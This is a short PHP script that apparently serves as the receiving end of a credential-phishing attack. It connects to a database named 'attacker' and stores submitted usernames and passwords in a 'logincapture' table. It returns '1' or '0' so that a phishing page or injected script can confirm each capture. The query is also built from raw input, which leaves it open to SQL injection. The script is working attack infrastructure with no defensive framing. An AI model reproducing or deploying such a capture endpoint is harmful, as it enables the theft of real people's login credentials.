<?php 
	$con = mysqli_connect("localhost","root","","attacker");
	// Check connection
	if (mysqli_connect_errno()) {
		echo "Failed to connect to MySQL: ".mysqli_connect_errno();
		exit();
	}

	if(isset($_POST['sendlogin'])) {
		$uname = isset($_POST['u']) ? $_POST['u'] : '';
		$pass = isset($_POST['p']) ? $_POST['p'] : '';
		$query = sprintf("INSERT INTO logincapture (user_id, username, password) VALUES (NULL, '%s', '%s')", $uname, $pass);
		$result = mysqli_query($con, $query);
		if($result) { echo "1"; }
		else { echo "0"; }
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
</body>
</html>